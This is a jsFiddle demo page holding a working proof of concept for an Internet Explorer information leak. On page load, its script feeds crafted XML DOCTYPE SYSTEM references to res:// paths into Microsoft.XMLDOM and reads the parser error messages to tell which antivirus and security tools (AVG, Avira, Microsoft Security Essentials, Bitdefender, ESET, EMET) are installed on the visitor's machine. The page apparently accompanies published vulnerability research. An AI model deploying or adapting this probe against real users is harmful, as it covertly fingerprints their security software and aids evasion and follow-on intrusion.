
<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <title> - jsFiddle demo</title>
  
  <script type='text/javascript' src='/js/lib/dummy.js'></script>
  
  
  
  
  <link rel="stylesheet" type="text/css" href="/css/result-light.css">
  
  <style type='text/css'>
    
  </style>
  

<script type='text/javascript'>//<![CDATA[ 
window.onload=function(){
//$target1$ = "res://c:\\validfile.txt"
//$target2$ = "res://c:\\windows\\system32\\drivers\\etc\\hosts"
//$target3$ = "res://c:\\Program Files (x86)\\AVG\\AVG2013\\"
$target4$ = "res://c:\\Program Files\\AVG\\AVG2015\\avgscanx.exe"
$target5$ = "res://C:\\Program Files\\Avira\\My Avira\\Avira.OE.ServiceHost.exe"
$target6$ = "res://C:\\Program Files\\Microsoft Security Client\\MsMpEng.exe"
$target7$ = "res://C:\\Program Files\\Bitdefender\\Bitdefender 2015\\bdagent.exe"
$target8$ = "res://C:\\Program Files\\ESET\\ESET NOD32 Antivirus\\egui.exe"
$target9$ = "res://C:\\Program Files\\EMET 4.1\\EMET_Agent.exe"

//validateXML('<?xml version="1.0" ?><!DOCTYPE anything SYSTEM "'+$target1$+'">')
//validateXML('<?xml version="1.0" ?><!DOCTYPE anything SYSTEM "'+$target2$+'">')
//validateXML('<?xml version="1.0" ?><!DOCTYPE anything SYSTEM "'+$target3$+'">')
validateXML('<?xml version="1.0" ?><!DOCTYPE anything SYSTEM "'+$target4$+'">')
validateXML('<?xml version="1.0" ?><!DOCTYPE anything SYSTEM "'+$target5$+'">')
validateXML('<?xml version="1.0" ?><!DOCTYPE anything SYSTEM "'+$target6$+'">')
validateXML('<?xml version="1.0" ?><!DOCTYPE anything SYSTEM "'+$target7$+'">')
validateXML('<?xml version="1.0" ?><!DOCTYPE anything SYSTEM "'+$target8$+'">')
validateXML('<?xml version="1.0" ?><!DOCTYPE anything SYSTEM "'+$target9$+'">')

//https://soroush.secproject.com/blog/2013/04/microsoft-xmldom-in-ie-can-divulge-information-of-local-drivenetwork-in-error-messages/
//http://jsfiddle.net/ubqug/5/
//https://www.virustotal.com/en/about/credits/

/////////////////////////////////////////////////////////////////////////////////
function validateXML(txt) {
    // code for IE
    if (window.ActiveXObject) {
        var xmlDoc = new ActiveXObject("Microsoft.XMLDOM");
        xmlDoc.async = true;
        try {
            xmlDoc.loadXML(txt);
			if (xmlDoc.parseError.errorCode != 0) {
				var err;
				err = xmlDoc.parseError.reason;
				var res = err.split("\n");
				err1 = res[1]
				err1 = err1.replace("Error processing resource 'res://","")
				err1 = err1.replace("'.","")
				if(String(err).indexOf("cannot find")<=0)
				{
					alert(err1);
				}
				var errReason = xmlDoc.parseError.reason.toLowerCase();
			} else {
                alert('No Error? Unknown!')
			}
        } catch (e) {
			alert(e);
        }
		
        
    } else {
        alert('you need to use IE')
    }
}
}//]]>  

</script>


</head>
<body>
  
  
</body>


</html>


